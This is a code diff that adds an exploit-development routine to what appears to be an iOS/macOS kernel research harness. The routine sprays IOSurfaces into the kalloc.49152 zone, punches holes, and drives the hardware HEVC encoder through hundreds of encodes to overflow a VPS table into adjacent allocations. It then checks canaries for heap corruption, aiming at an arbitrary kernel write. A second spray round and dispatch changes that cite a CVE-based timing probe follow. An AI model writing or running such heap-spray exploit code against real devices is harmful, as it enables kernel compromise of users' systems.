@@ -14099,6 +14099,475 @@ static void r335_probe(void) {
     fflush(stdout);
 }
 
+/* r336: AVE Heap Overflow Exploitation with IOSurface Spray
+   r335/r331 found: lid=0x1 survives 350 encodes past the 0xC000 kalloc.49152
+   boundary. The VPS table at ~0x9B10 in a 0xC000 allocation overflows into
+   the adjacent allocation. Strategy:
+   1. Spray IOSurface backing buffers in kalloc.49152 to surround the AVE VPS table
+   2. Encode with lid=1 to overflow past boundary into IOSurface data
+   3. Check IOSurface pixel data for corruption (kernel heap corruption primitive)
+   4. If corruption found → we have arbitrary kernel write via controlled overflow */
+static void r336_probe(void) {
+    rlog("\n=== r336: AVE Heap Overflow + IOSurface Spray Exploitation ===\n");
+    rlog("  lid=1 survived 350 encodes past 0xC000 boundary (kalloc.49152)\n");
+    rlog("  Strategy: IOSurface spray → AVE overflow → check corruption\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: IOSurface heap spray in kalloc.49152 ---- */
+    rlog("--- Part 1: IOSurface heap spray (kalloc.49152 target) ---\n");
+    fflush(stdout);
+
+    /* We need IOSurfaces whose kernel backing allocation lands in kalloc.49152.
+       A surface with alloc_size ~40960-49152 bytes should use kalloc.49152.
+       128 * 128 * 3 = 49152 bytes (RGB, no alpha) — perfect fit */
+    #define SPRAY_COUNT 128
+    #define SPRAY_WIDTH  128
+    #define SPRAY_HEIGHT 128
+    #define SPRAY_BPE    3   /* bytes per element (RGB) → 128*128*3 = 49152 = 0xC000 */
+    #define SPRAY_MAGIC  0xCA /* canary byte to detect corruption */
+
+    IOSurfaceRef spray_surfaces[SPRAY_COUNT];
+    int spray_created = 0;
+
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        int w = SPRAY_WIDTH, h = SPRAY_HEIGHT, bpe = SPRAY_BPE, bpr = w * bpe;
+        int alloc_sz = bpr * h; /* 49152 = 0xC000 */
+        uint32_t pf = 0x00000018; /* kCVPixelFormatType_24RGB */
+
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef nsz = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+        CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nsz);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), npf);
+
+        spray_surfaces[i] = IOSurfaceCreate(props);
+        if (spray_surfaces[i]) {
+            spray_created++;
+            /* Fill with canary pattern */
+            IOSurfaceLock(spray_surfaces[i], 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(spray_surfaces[i]);
+            if (base) {
+                memset(base, SPRAY_MAGIC, alloc_sz);
+                /* Write surface index at start for identification */
+                ((uint32_t *)base)[0] = 0xDEAD0000 | i;
+                ((uint32_t *)base)[1] = 0xBEEF0000 | i;
+            }
+            IOSurfaceUnlock(spray_surfaces[i], 0, NULL);
+        }
+
+        CFRelease(nw); CFRelease(nh); CFRelease(nbpe);
+        CFRelease(nbpr); CFRelease(nsz); CFRelease(npf);
+        CFRelease(props);
+    }
+    rlog("  Sprayed %d IOSurfaces (128x128 RGB = 0xC000 each)\n", spray_created);
+    rlog("  Target zone: kalloc.49152 (0xC000)\n");
+    rlog("  Canary byte: 0x%02X, headers: DEAD/BEEF + index\n\n", SPRAY_MAGIC);
+    fflush(stdout);
+
+    /* ---- Part 2: Free holes to place AVE VPS table adjacent to surfaces ---- */
+    rlog("--- Part 2: Create holes for AVE VPS table placement ---\n");
+    fflush(stdout);
+
+    /* Free every other surface to create holes the AVE allocator can fill */
+    int freed = 0;
+    for (int i = 1; i < spray_created; i += 2) {
+        if (spray_surfaces[i]) {
+            CFRelease(spray_surfaces[i]);
+            spray_surfaces[i] = NULL;
+            freed++;
+        }
+    }
+    rlog("  Freed %d alternating surfaces (holes for AVE)\n", freed);
+    rlog("  Remaining surfaces are canary sentinels\n\n");
+    fflush(stdout);
+
+    /* ---- Part 3: Create AVE encoder with lid=1 (overflow-surviving config) ---- */
+    rlog("--- Part 3: AVE MV-HEVC encode with lid=1 (overflow trigger) ---\n");
+    fflush(stdout);
+
+    /* Use VideoToolbox to create an MV-HEVC encoder session */
+    OSStatus status;
+    VTCompressionSessionRef ave_session = NULL;
+
+    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+
+    /* Request hardware AVE encoder */
+    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+
+    /* Create MV-HEVC compression session */
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault,
+        1920, 1080, /* width, height */
+        kCMVideoCodecType_HEVC,
+        enc_spec,
+        NULL, /* source pixel buffer attributes */
+        kCFAllocatorDefault,
+        NULL, NULL, /* callback — not needed for sync */
+        &ave_session);
+
+    rlog("  VTCompressionSession create: status=%d session=%p\n",
+         (int)status, (void *)ave_session);
+
+    if (status != 0 || !ave_session) {
+        rlog("  FAIL: Cannot create AVE session. Checking corruption anyway...\n\n");
+        goto check_corruption;
+    }
+
+    /* Configure for MV-HEVC stereo (triggers VPS table allocation in kalloc.49152) */
+    /* Set the heroEye and hasLeftAndRightViewIds to trigger stereo path */
+    int hero_eye = 0; /* left eye is hero */
+    CFNumberRef hero_num = CFNumberCreate(NULL, kCFNumberIntType, &hero_eye);
+    VTSessionSetProperty(ave_session, CFSTR("HeroEye"), hero_num);
+    CFRelease(hero_num);
+
+    VTSessionSetProperty(ave_session, CFSTR("HasLeftAndRightViewIds"), kCFBooleanTrue);
+
+    /* Enable stereo multiview */
+    CFMutableArrayRef view_ids = CFArrayCreateMutable(kCFAllocatorDefault, 2, &kCFTypeArrayCallBacks);
+    int vid0 = 0, vid1 = 1;
+    CFNumberRef v0 = CFNumberCreate(NULL, kCFNumberIntType, &vid0);
+    CFNumberRef v1 = CFNumberCreate(NULL, kCFNumberIntType, &vid1);
+    CFArrayAppendValue(view_ids, v0);
+    CFArrayAppendValue(view_ids, v1);
+    VTSessionSetProperty(ave_session, CFSTR("MVHEVCViewIds"), view_ids);
+    CFRelease(v0); CFRelease(v1); CFRelease(view_ids);
+
+    /* Prepare to encode */
+    VTCompressionSessionPrepareToEncodeFrames(ave_session);
+
+    /* Encode frames with lid=1 to trigger overflow past 0xC000 boundary */
+    /* Need ~314 encodes to reach 0xC000, do 400 to ensure overflow */
+    #define OVERFLOW_ENCODE_COUNT 400
+
+    rlog("  Encoding %d frames with MV-HEVC stereo (lid=1 path)...\n", OVERFLOW_ENCODE_COUNT);
+    fflush(stdout);
+
+    int encode_ok = 0, encode_err = 0;
+    for (int frame = 0; frame < OVERFLOW_ENCODE_COUNT; frame++) {
+        /* Create a pixel buffer for encoding */
+        CVPixelBufferRef pixbuf = NULL;
+        NSDictionary *pbattrs = @{
+            (id)kCVPixelBufferWidthKey: @1920,
+            (id)kCVPixelBufferHeightKey: @1080,
+            (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
+            (id)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        };
+        CVReturn cvr = CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
+            kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+            (__bridge CFDictionaryRef)pbattrs, &pixbuf);
+
+        if (cvr != 0 || !pixbuf) {
+            encode_err++;
+            if (encode_err == 1)
+                rlog("  Frame %d: CVPixelBufferCreate failed (%d)\n", frame, cvr);
+            continue;
+        }
+
+        /* Fill with test pattern */
+        CVPixelBufferLockBaseAddress(pixbuf, 0);
+        void *y_base = CVPixelBufferGetBaseAddressOfPlane(pixbuf, 0);
+        if (y_base) memset(y_base, (frame & 0xFF), CVPixelBufferGetBytesPerRowOfPlane(pixbuf, 0) * 1080);
+        CVPixelBufferUnlockBaseAddress(pixbuf, 0);
+
+        /* Create presentation timestamp */
+        CMTime pts = CMTimeMake(frame, 30);
+
+        /* Encode */
+        status = VTCompressionSessionEncodeFrame(
+            ave_session, pixbuf, pts, kCMTimeInvalid,
+            NULL, NULL, NULL);
+
+        if (status == 0) encode_ok++;
+        else encode_err++;
+
+        CVPixelBufferRelease(pixbuf);
+
+        /* Log progress */
+        if (frame % 100 == 0 || frame == OVERFLOW_ENCODE_COUNT - 1) {
+            rlog("  Frame %d: ok=%d err=%d (status=%d)\n", frame, encode_ok, encode_err, (int)status);
+            fflush(stdout);
+        }
+    }
+
+    /* Flush encoder to ensure all frames processed */
+    VTCompressionSessionCompleteFrames(ave_session, kCMTimeInvalid);
+
+    rlog("  Encoding complete: %d ok, %d errors out of %d\n",
+         encode_ok, encode_err, OVERFLOW_ENCODE_COUNT);
+    rlog("  If ok>314, VPS table has overflowed past 0xC000 boundary\n\n");
+    fflush(stdout);
+
+check_corruption:
+    /* ---- Part 4: Check IOSurface canaries for corruption ---- */
+    rlog("--- Part 4: Checking IOSurface canaries for heap corruption ---\n");
+    fflush(stdout);
+
+    int corrupted_count = 0;
+    int checked_count = 0;
+
+    for (int i = 0; i < SPRAY_COUNT; i += 2) {
+        if (!spray_surfaces[i]) continue;
+        checked_count++;
+
+        IOSurfaceLock(spray_surfaces[i], kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(spray_surfaces[i]);
+        if (!base) {
+            IOSurfaceUnlock(spray_surfaces[i], kIOSurfaceLockReadOnly, NULL);
+            continue;
+        }
+
+        /* Check header magic */
+        uint32_t hdr0 = ((uint32_t *)base)[0];
+        uint32_t hdr1 = ((uint32_t *)base)[1];
+        int header_ok = (hdr0 == (0xDEAD0000 | i)) && (hdr1 == (0xBEEF0000 | i));
+
+        /* Scan canary bytes for corruption */
+        uint8_t *bytes = (uint8_t *)base;
+        int corrupted_bytes = 0;
+        int first_corrupt_offset = -1;
+        /* Skip first 8 bytes (our headers), check rest */
+        for (int b = 8; b < 49152 && corrupted_bytes < 256; b++) {
+            if (bytes[b] != SPRAY_MAGIC) {
+                if (first_corrupt_offset < 0) first_corrupt_offset = b;
+                corrupted_bytes++;
+            }
+        }
+
+        if (!header_ok || corrupted_bytes > 0) {
+            corrupted_count++;
+            rlog("  *** SURFACE[%d] CORRUPTED! ***\n", i);
+            rlog("    header: 0x%08X 0x%08X (expected 0x%08X 0x%08X) %s\n",
+                 hdr0, hdr1, 0xDEAD0000 | i, 0xBEEF0000 | i,
+                 header_ok ? "OK" : "CORRUPTED");
+            rlog("    corrupted_bytes: %d, first at offset 0x%X\n",
+                 corrupted_bytes, first_corrupt_offset);
+
+            /* Dump first corrupted region */
+            if (first_corrupt_offset >= 0) {
+                rlog("    Dump at corruption point (offset 0x%X):\n      ", first_corrupt_offset);
+                int dump_start = first_corrupt_offset & ~0xF;
+                for (int d = dump_start; d < dump_start + 64 && d < 49152; d++) {
+                    rlog("%02X ", bytes[d]);
+                    if ((d + 1) % 16 == 0) rlog("\n      ");
+                }
+                rlog("\n");
+            }
+        }
+
+        IOSurfaceUnlock(spray_surfaces[i], kIOSurfaceLockReadOnly, NULL);
+    }
+
+    rlog("  Checked %d surfaces: %d corrupted\n", checked_count, corrupted_count);
+    if (corrupted_count > 0) {
+        rlog("  *** HEAP CORRUPTION CONFIRMED! AVE overflow wrote into IOSurface data ***\n");
+        rlog("  This is a kernel heap corruption primitive!\n");
+    } else {
+        rlog("  No corruption detected. Possible causes:\n");
+        rlog("    - AVE VPS table didn't land adjacent to our surfaces\n");
+        rlog("    - Need more spray or different hole pattern\n");
+        rlog("    - lid=1 overflow writes are within-allocation (doesn't cross boundary)\n");
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* ---- Part 5: Second attempt with tighter spray ---- */
+    rlog("--- Part 5: Retry with 256-surface spray and sequential free ---\n");
+    fflush(stdout);
+
+    /* Release remaining surfaces from first spray */
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        if (spray_surfaces[i]) {
+            CFRelease(spray_surfaces[i]);
+            spray_surfaces[i] = NULL;
+        }
+    }
+
+    /* Tighter spray: 256 surfaces, free specific indices */
+    #define SPRAY2_COUNT 256
+    IOSurfaceRef spray2[SPRAY2_COUNT];
+    int spray2_created = 0;
+
+    for (int i = 0; i < SPRAY2_COUNT; i++) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        int w = SPRAY_WIDTH, h = SPRAY_HEIGHT, bpe = SPRAY_BPE, bpr = w * bpe;
+        int alloc_sz = bpr * h;
+        uint32_t pf = 0x00000018;
+
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef nsz = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+        CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nsz);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), npf);
+
+        spray2[i] = IOSurfaceCreate(props);
+        if (spray2[i]) {
+            spray2_created++;
+            IOSurfaceLock(spray2[i], 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(spray2[i]);
+            if (base) {
+                memset(base, 0xBB, alloc_sz);
+                ((uint32_t *)base)[0] = 0xFACE0000 | i;
+            }
+            IOSurfaceUnlock(spray2[i], 0, NULL);
+        }
+
+        CFRelease(nw); CFRelease(nh); CFRelease(nbpe);
+        CFRelease(nbpr); CFRelease(nsz); CFRelease(npf);
+        CFRelease(props);
+    }
+    rlog("  Spray2: created %d surfaces\n", spray2_created);
+
+    /* Free a cluster in the middle to create a large free region */
+    int freed2 = 0;
+    for (int i = 100; i < 140; i++) {
+        if (spray2[i]) {
+            CFRelease(spray2[i]);
+            spray2[i] = NULL;
+            freed2++;
+        }
+    }
+    rlog("  Freed cluster [100-139]: %d surfaces\n", freed2);
+    fflush(stdout);
+
+    /* Trigger AVE encode again (new session needed) */
+    if (ave_session) {
+        VTCompressionSessionInvalidate(ave_session);
+        CFRelease(ave_session);
+        ave_session = NULL;
+    }
+
+    /* Create a fresh AVE session — this allocates a new VPS table that
+       should land in the freed hole among our spray */
+    VTCompressionSessionRef ave2 = NULL;
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 1920, 1080,
+        kCMVideoCodecType_HEVC, enc_spec, NULL,
+        kCFAllocatorDefault, NULL, NULL, &ave2);
+
+    rlog("  AVE session 2: status=%d\n", (int)status);
+
+    if (status == 0 && ave2) {
+        VTSessionSetProperty(ave2, CFSTR("HasLeftAndRightViewIds"), kCFBooleanTrue);
+        int hero2 = 0;
+        CFNumberRef h2 = CFNumberCreate(NULL, kCFNumberIntType, &hero2);
+        VTSessionSetProperty(ave2, CFSTR("HeroEye"), h2);
+        CFRelease(h2);
+
+        CFMutableArrayRef vids2 = CFArrayCreateMutable(kCFAllocatorDefault, 2, &kCFTypeArrayCallBacks);
+        CFNumberRef va = CFNumberCreate(NULL, kCFNumberIntType, &vid0);
+        CFNumberRef vb = CFNumberCreate(NULL, kCFNumberIntType, &vid1);
+        CFArrayAppendValue(vids2, va); CFArrayAppendValue(vids2, vb);
+        VTSessionSetProperty(ave2, CFSTR("MVHEVCViewIds"), vids2);
+        CFRelease(va); CFRelease(vb); CFRelease(vids2);
+
+        VTCompressionSessionPrepareToEncodeFrames(ave2);
+
+        /* Encode 400 frames to overflow */
+        int ok2 = 0, err2 = 0;
+        for (int f = 0; f < OVERFLOW_ENCODE_COUNT; f++) {
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
+                kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NULL, &pb);
+            if (!pb) { err2++; continue; }
+
+            CMTime pts = CMTimeMake(f, 30);
+            status = VTCompressionSessionEncodeFrame(ave2, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
+            if (status == 0) ok2++; else err2++;
+            CVPixelBufferRelease(pb);
+        }
+        VTCompressionSessionCompleteFrames(ave2, kCMTimeInvalid);
+        rlog("  Spray2 encode: %d ok, %d err\n", ok2, err2);
+
+        VTCompressionSessionInvalidate(ave2);
+        CFRelease(ave2);
+    }
+
+    /* Check spray2 for corruption */
+    int corrupted2 = 0, checked2 = 0;
+    for (int i = 0; i < SPRAY2_COUNT; i++) {
+        if (!spray2[i]) continue;
+        checked2++;
+
+        IOSurfaceLock(spray2[i], kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(spray2[i]);
+        if (!base) {
+            IOSurfaceUnlock(spray2[i], kIOSurfaceLockReadOnly, NULL);
+            continue;
+        }
+
+        uint32_t hdr = ((uint32_t *)base)[0];
+        int hdr_ok = (hdr == (0xFACE0000 | i));
+        uint8_t *bytes = (uint8_t *)base;
+        int bad = 0;
+        int first_bad = -1;
+        for (int b = 4; b < 49152 && bad < 256; b++) {
+            if (bytes[b] != 0xBB) {
+                if (first_bad < 0) first_bad = b;
+                bad++;
+            }
+        }
+
+        if (!hdr_ok || bad > 0) {
+            corrupted2++;
+            rlog("  *** SPRAY2[%d] CORRUPTED! hdr=0x%08X bad_bytes=%d first=0x%X ***\n",
+                 i, hdr, bad, first_bad);
+            if (first_bad >= 0) {
+                int ds = first_bad & ~0xF;
+                rlog("    ");
+                for (int d = ds; d < ds + 48 && d < 49152; d++)
+                    rlog("%02X ", bytes[d]);
+                rlog("\n");
+            }
+        }
+
+        IOSurfaceUnlock(spray2[i], kIOSurfaceLockReadOnly, NULL);
+    }
+
+    rlog("  Spray2: checked %d, corrupted %d\n", checked2, corrupted2);
+    if (corrupted2 > 0)
+        rlog("  *** HEAP CORRUPTION CONFIRMED IN SPRAY2! ***\n");
+
+    /* Cleanup spray2 */
+    for (int i = 0; i < SPRAY2_COUNT; i++)
+        if (spray2[i]) CFRelease(spray2[i]);
+
+    if (enc_spec) CFRelease(enc_spec);
+
+    rlog("\n=== r336 complete ===\n");
+    fflush(stdout);
+}
+
 /* r332: XPC-based service probing + containermanagerd/installd reply capture
    r331: securityd/trustd accept all MIG IDs (one-way), rpc crashes.
    Try XPC API for proper bidirectional communication + probe services
@@ -45240,18 +45709,24 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 339) {
+            rlog("*** rounds=339: AVE Heap Overflow + IOSurface Spray ***\n");
+            rlog("  lid=1 survives 350+ encodes past 0xC000. Spray+overflow+check.\n\n");
+            r336_probe();
+            goto done;
+        }
+        if (rounds == 338) {
+            rlog("*** rounds=338: KernelSnitch-Adapted XNU Hash Table Timing ***\n");
+            rlog("  Based on: Maar et al. NDSS 2025, CVE-2026-43754 (macOS)\n");
+            rlog("  Probe: ulock timing, psynch, os_sync, Mach trap speculative timing.\n\n");
+            r335_kernelsnitch_probe();
+            goto done;
+        }
         if (rounds == 337) {
             rlog("*** rounds=337: vm_region Object ID Deep Exploit ***\n");
             rlog("  r334: found high/negative object_ids in vm_region.\n");
             rlog("  Probe: all flavors, full 64-bit obj ptrs, IOSurface regions.\n\n");
             r335_probe();
-            goto done;
-        }
-        if (rounds == 337) {
-            rlog("*** rounds=337: KernelSnitch-Adapted XNU Hash Table Timing ***\n");
-            rlog("  Based on: Maar et al. NDSS 2025, CVE-2026-43754 (macOS)\n");
-            rlog("  Probe: ulock timing, psynch, os_sync, Mach trap speculative timing.\n\n");
-            r335_kernelsnitch_probe();
             goto done;
         }
         if (rounds == 336) {
